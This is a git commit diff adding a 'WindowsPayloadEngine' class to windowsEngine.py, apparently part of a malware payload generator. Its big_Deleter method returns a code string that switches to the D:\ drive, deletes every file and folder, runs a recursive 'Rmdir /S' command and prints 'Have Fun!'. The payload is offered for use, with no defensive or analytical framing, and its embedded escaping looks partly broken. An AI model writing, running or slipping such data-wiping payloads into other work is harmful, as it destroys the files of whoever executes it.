1c9c3860ff8d57c56569c4032d151e3ab320e79c
AntibioticsABX <62002585+AntibioticsABX@users.noreply.github.com>
2020-10-26 21:41:28 +0630

    windows payload 'big_deleter added'

--- windowsEngine.py
+++ windowsEngine.py
@@ -1,13 +1,33 @@
 # import os
 # import socket
 # import getpass
-#
-#
-#
-# class WindowsPayloadEngine():
-#
-#     def big_Deleter(self):
-#
-#         cwd = os.getcwd()
-#
-# print(getpass.getuser())
+
+
+
+class WindowsPayloadEngine():
+
+    def big_Deleter(self):
+
+        code = """
+        import os
+        
+        os.chdir('D:\\')
+        cwd = os.getcwd()
+        files = os.listdir(cwd)
+
+        for file in files:
+        \ttry:
+        \t\tif os.path.isfile(file):
+        \t\t\t\os.remove(file)
+        \t\telif os.path.isdir(file):
+        \t\t\tos.rmdir(file)
+        \t\telse:
+        \t\t\tpass
+        \texcept FileNotFoundError as e:
+        \t\tprint(e)
+        \tfinally:
+        \t\tos.system('cd D:\\')
+        \t\tos.system('Rmdir /S "*"')
+        \t\tprint('Have Fun!')"""
+
+        return code
